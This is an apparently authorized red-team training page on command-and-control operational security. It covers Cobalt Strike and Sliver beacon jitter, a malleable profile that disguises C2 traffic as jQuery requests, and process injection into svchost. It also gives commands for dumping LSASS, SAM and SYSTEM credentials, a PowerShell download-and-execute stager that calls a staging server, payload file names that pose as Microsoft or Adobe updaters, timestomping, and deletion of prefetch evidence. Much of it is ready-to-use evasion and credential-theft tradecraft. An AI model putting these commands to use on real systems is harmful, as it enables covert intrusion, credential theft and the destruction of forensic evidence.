---
layout: training-page
title: "C2 OPSEC — Red Team Academy"
module: "C2 Frameworks"
tags:
  - opsec
  - c2
  - evasion
  - infrastructure
page_key: "c2-opsec"
render_with_liquid: false
---

# C2 OPSEC

## Why C2 OPSEC Matters

Operational security for your C2 infrastructure determines how long you stay undetected. A technically perfect implant can be burned in minutes if the team server is trivially attributable, the beacon interval is obvious, or you reuse infrastructure across engagements. C2 OPSEC covers **infrastructure design, beacon behavior, traffic shaping, and operational hygiene** — all the things that let an implant survive in a mature SOC environment.

## Infrastructure Segmentation

Never expose your team server directly. Tier your infrastructure so that defenders burning one component cannot attribute the rest.

```
# Recommended C2 infrastructure tiers:
#
#  Tier 1 — Phishing/payload delivery:  throw-away VPS, short-lived domains
#  Tier 2 — Redirectors:                cheap VPS (different provider per redirector)
#  Tier 3 — Team server:                isolated, no public exposure, whitelisted IPs only
#
# Rules:
#  - Team server port 443/80 accepts connections ONLY from your redirector IPs
#  - Team server has no other inbound internet exposure
#  - SSH to team server via VPN or jump host only — never direct from home IP
#  - If a redirector is burned → spin up a new one, no impact to team server or other ops
#  - Never reuse IPs or domains across different clients or engagements

# Team server firewall (ufw example):
ufw default deny incoming
ufw allow from <REDIRECTOR_IP_1> to any port 443   # HTTPS C2
ufw allow from <REDIRECTOR_IP_2> to any port 443
ufw allow from <VPN_IP> to any port 50050            # Cobalt Strike team server port
ufw allow from <VPN_IP> to any port 22               # SSH — VPN only
ufw enable
```

## Beacon Timing and Jitter

Consistent beacon intervals are one of the most reliable detection methods available to SOCs. Network sensors and SIEM rules look for hosts making connections to external IPs at regular intervals. Adding jitter makes the interval non-deterministic.

```
# Cobalt Strike — sleep and jitter in malleable profile or interactively:
# sleep <base_seconds> <jitter_percent>
beacon> sleep 3600 25    # check-in every ~45-75 minutes (25% jitter on 3600s base)
beacon> sleep 300 30     # every ~3.5-6.5 minutes (active phase)
beacon> sleep 60 20      # every ~48-72 seconds (lateral movement)

# Sliver beacon timing:
sliver> generate beacon --http <IP> --seconds 3600 --jitter 900 --os windows

# Sliver — change timing after deployment:
sliver (beacon)> reconfig --beacon-interval 3600 --beacon-jitter 900

# General guidance:
# Long-haul / persistence:    60-120 min sleep, 20-30% jitter
# Active enumeration phase:   5-10 min sleep, 20% jitter
# Lateral movement / exploit: 30-60 sec sleep (accept higher detection risk)
# Never use 0 jitter on any sleep above a lab environment
```

## Malleable C2 Profiles — Traffic Shaping

Malleable C2 profiles (Cobalt Strike) and HTTP C2 config (Sliver) control the shape of beacon traffic — URIs, HTTP headers, response body format. Traffic shaped to mimic a legitimate application is far harder to fingerprint than default framework traffic.

```
# Default Cobalt Strike HTTP traffic (trivially detectable by JA3/URI):
# GET /dpixel  HTTP/1.1
# Host: <teamserver>
# User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; ...)
# Immediate IOC — never use defaults in real ops

# Malleable profile — mimic jQuery CDN traffic:
# Save as jquery.profile → ./teamserver <IP> <password> jquery.profile
set sleeptime "60000";      # 60 second sleep
set jitter    "20";         # 20% jitter

http-get {
    set uri "/jquery-3.6.0.min.js";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Referer" "https://code.jquery.com/";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "public, max-age=31536000";
        output {
            base64url;
            prepend "/*! jQuery v3.6.0 */";
            append "//# sourceMappingURL=jquery.min.map";
            print;
        }
    }
}

http-post {
    set uri "/jquery-3.6.0.min.map";
    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        id {
            base64url;
            prepend "v=";
            parameter "version";
        }
        output {
            base64url;
            print;
        }
    }
    server {
        output {
            base64url;
            print;
        }
    }
}

# Sliver HTTP C2 profile (~/.sliver/config/http-c2.json):
# Edit URL patterns, file extensions, and headers to mimic a specific app.
# See: sliver documentation → HTTPS C2 configuration
```

## Process Injection OPSEC

Where your implant lives matters as much as what it does. Injecting into or spawning as suspicious processes triggers behavioral EDR alerts. Choose host processes wisely.

```
# High-risk processes (avoid injecting into / running as):
# cmd.exe, powershell.exe, wscript.exe, cscript.exe, mshta.exe
# — these are heavily monitored; parent/child relationships are analyzed

# Low-risk processes to target for injection or spawnto:
# svchost.exe   — ubiquitous, expected to have network activity
# RuntimeBroker.exe — legitimate Windows process, lower scrutiny
# sihost.exe, explorer.exe — common but process injection still flagged by EDR

# Cobalt Strike — set spawnto (process used for fork-and-run):
beacon> spawnto x64 %windir%\sysnative\svchost.exe
beacon> spawnto x86 %windir%\syswow64\svchost.exe

# Cobalt Strike — inject into an existing process:
beacon> inject <PID> x64 <listener>
# Choose a PID with matching integrity level and architecture

# Sliver — specify injection target:
sliver (session)> execute-assembly --process svchost.exe Seatbelt.exe -group=all

# Avoid:
# - CreateRemoteThread into LSASS (flagged by virtually every EDR)
# - Spawning child processes from Office apps (flagged by DCOM/macro detections)
# - APC injection into processes owned by other users (triggers cross-session events)
```

## Credential Dumping OPSEC

LSASS dumps are among the most-detected actions in an engagement. Direct `MiniDumpWriteDump` via the Windows API is flagged by every EDR. Use indirect methods.

```
# Avoid (guaranteed EDR alert in mature environments):
# procdump.exe -ma lsass.exe lsass.dmp
# Task Manager → lsass → Create Dump File
# Direct MiniDumpWriteDump API calls against LSASS

# Better: dump via Volume Shadow Copy (no LSASS handle):
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
# Parse offline: secretsdump.py -sam SAM -system SYSTEM LOCAL

# Better: Nanodump (Sliver armory) — avoids MiniDumpWriteDump, uses direct syscalls:
sliver (session)> nanodump --pid <lsass_pid> --write C:\Temp\out.dmp --valid

# Better: LSASS snapshot via comsvcs.dll (LOLBin):
# rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Temp\lsass.dmp full
# Still flagged by many EDRs but less so than procdump

# Better: Remote LSASS dump via dragoncastle / Pypykatz (don't touch LSASS locally):
# From a remote privileged session using SMB or WinRM:
# secretsdump.py domain/admin@<target> -hashes :<NTLM> (DCSync method — no LSASS touch)
```

## Network OPSEC

Network behavior — connection frequency, destination ports, payload size patterns, TLS fingerprint — all feed into detection. Think about how your traffic appears to a network analyst.

```
# TLS fingerprinting — JA3/JA3S:
# Every TLS client has a fingerprint based on cipher suites, extensions, and versions.
# Cobalt Strike's default JA3 is well-known and in every threat intel database.
# - Use a custom JA3 by configuring the ssl-certificate block in your malleable profile
# - Or route through a legitimate TLS-terminating CDN (Cloudflare, CloudFront)

# Cobalt Strike — custom TLS cert in malleable profile:
# https-certificate {
#     set keystore "/path/to/domain.store";
#     set password "keystorepassword";
# }
# Generate keystore: keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store
#                                   -storepass password -validity 365
#                                   -dname "CN=yourdomain.com, O=Acme, C=US"

# DNS resolution behavior:
# - Implants performing unusual DNS queries (long labels, high-entropy subdomains) are flagged
# - DNS-based C2 generates far more DNS queries than normal — use high sleep values
# - Legitimate Windows hosts resolve ~10-50 DNS queries/hour; DNS C2 can generate hundreds

# Avoid:
# - Connecting to IPs with no PTR record (many EDR products flag this)
# - Using non-standard ports (8443, 4444, 1337) — use 443 or 80
# - Large POST bodies with no realistic web app context
# - HTTP traffic without a Host header matching a real domain
```

## Payload Delivery OPSEC

How the initial payload reaches the target is as important as the payload itself. Delivery artifacts — email headers, file metadata, staging URLs — can attribute your infrastructure before the engagement is active.

```
# Strip metadata from Office documents before use as lures:
exiftool -all= lure.docx

# Payload staging — don't serve the full implant from a long-lived domain:
# Use a throw-away HTTP server for one-time payload delivery:
python3 -m http.server 8080   # adequate for lab; use nginx for ops

# One-liner stager (memory-only, avoids disk write):
# PowerShell (victim downloads and runs in memory):
# IEX(New-Object Net.WebClient).DownloadString('http://staging-server/stager.ps1')

# Limit stager availability window:
# After delivery, take down the staging server so the URL becomes a dead link.
# This prevents defenders from downloading and analyzing your payload post-incident.

# File names — avoid obvious names:
# Bad:  beacon.exe, implant.exe, shell.exe, payload.exe
# Good: MicrosoftEdgeUpdate.exe, AdobeARM.exe, OneDriveSetup.exe, SysInfo.exe

# Timestamps — timestomping to match the directory:
# (Windows, from existing session)
# cmd: copy /b file.exe + ,, file.exe   ← touches timestamp
# Cobalt Strike: timestomp <src_file> <dst_file>
# Note: NTFS change time ($STANDARD_INFORMATION vs $FILE_NAME) — advanced forensics still detects
```

## Logging and Evidence Minimization

Every action you take creates artifacts. Effective C2 OPSEC means knowing what artifacts each technique creates and minimizing those that could be recovered post-engagement or during incident response.

```
# Windows Event Log artifacts to be aware of:
# 4624 — Logon (every lateral movement generates this)
# 4688 — Process creation (if auditing enabled — see Sysmon rule 1)
# 7045 — New service installed (psexec, Sliver psexec, any service-based technique)
# 4698 — Scheduled task created
# 4720 — New user account created

# PowerShell logging:
# Script Block Logging (Event 4104) — captures executed PS code even if obfuscated
# Module Logging (Event 4103) — logs PowerShell module activity
# Transcription — logs all PS session input/output to a file
# Bypass: use .NET directly (no PowerShell process), use BOFs, use compiled .NET assemblies

# Prefetch — records last 1024 program executions (Win 10+):
# C:\Windows\Prefetch\TOOLNAME.EXE-*.pf
# Minimization: run tools from memory (execute-assembly), avoid writing to disk
# Delete prefetch (requires SYSTEM or admin — also creates an event):
# del C:\Windows\Prefetch\TOOLNAME*

# Shimcache / AppCompatCache — records executed binaries:
# HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
# Only cleared on reboot — clearing requires registry write and draws attention

# MFT / $USN Journal — records every file operation:
# Tools that touch disk are logged here; recovery possible after deletion
# Minimization: keep tools in memory (execute-assembly, BOF, in-memory loading)

# Network:
# Firewall logs on perimeter and internal firewalls capture all lateral movement
# Minimize by using existing network flows (e.g., PSRemoting on ports already open)
# Avoid scanning — each scan target IP appears in firewall logs
```

## Cobalt Strike OPSEC Checklist

- **Custom malleable profile** — never use the default. Profile must pass the C2lint check.
- **Custom TLS certificate** — JA3 fingerprint of default CS is in every threat intel feed.
- **sleep + jitter set immediately on callback** — first action in every beacon.
- **spawnto configured** — never let fork-and-run use the default (rundll32.exe).
- **Redirectors in front of team server** — team server firewall blocks all except redirector IPs.
- **Aged, categorized domains** — register domains weeks in advance, get them categorized.
- **killdate set in profile** — implants expire after the engagement window.
- **Avoid running C2lint-failing profiles** — malformed profiles generate noisy traffic.

## Sliver OPSEC Checklist

- **Use beacon mode, not session mode** — session mode maintains persistent connection (very noisy).
- **Symbol obfuscation on** — do not use `--skip-symbols` in production; Go import paths are visible in plaintext.
- **Custom HTTP C2 profile** — edit `~/.sliver/config/http-c2.json` before any op.
- **Use HTTPS, not HTTP** — HTTP C2 is in plaintext; detectable by any network inspection.
- **Avoid default psexec service names** — change `--service-name` from "Sliver" to something plausible.
- **Use armory BOFs instead of execute-assembly where possible** — BOFs run in-process, no child spawn.
- **reconfig beacon timing after initial access** — default 60s interval is too aggressive for long-haul ops.

## OPSEC Failure Modes

```
# Common OPSEC failures and how defenders catch them:

# 1. Default framework traffic
#    Failure: Using default CS or Sliver HTTP profile
#    Detection: JA3 fingerprint match, URI pattern match (Suricata/Snort rules)
#    Fix: Custom malleable profile, custom TLS cert

# 2. Beaconing without jitter
#    Failure: Beacon every 60 seconds, exactly
#    Detection: SIEM beaconing detection rule (connection to same IP every N seconds)
#    Fix: sleep 60 20 (60s base, 20% jitter)

# 3. Team server exposed directly
#    Failure: Implant connects directly to team server IP
#    Detection: Threat intel scan of team server IP → identified as C2
#    Fix: Redirectors in front of team server; team server whitelisted to redirector only

# 4. Reusing infrastructure across engagements
#    Failure: Same VPS or domain used in multiple ops
#    Detection: Threat intel links new campaign to previous attribution
#    Fix: New infrastructure per engagement, burn everything after

# 5. Noisy enumeration
#    Failure: Running nmap, BloodHound, or Seatbelt with default settings
#    Detection: Network IDS / Sysmon process creation with known tool arguments
#    Fix: Run enumeration through session, target individual hosts, use signed binaries

# 6. Touching LSASS directly
#    Failure: procdump lsass.exe or direct MiniDumpWriteDump
#    Detection: EDR PPL (Protected Process Light) blocks access; event generated
#    Fix: Nanodump, DCSync, VSS shadow copy, remote dump via secretsdump
```

## Key Resources

- [Official CS OPSEC guidance](https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/)
- [Red team infrastructure wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
- [Malleable C2 profile documentation](https://www.cobaltstrike.com/help-malleable-c2)
- [Community malleable profiles](https://github.com/BC-SECURITY/Malleable-C2-Profiles)
- *Red Team Development and Operations* by Joe Vest & James Tubberville — infrastructure OPSEC chapter
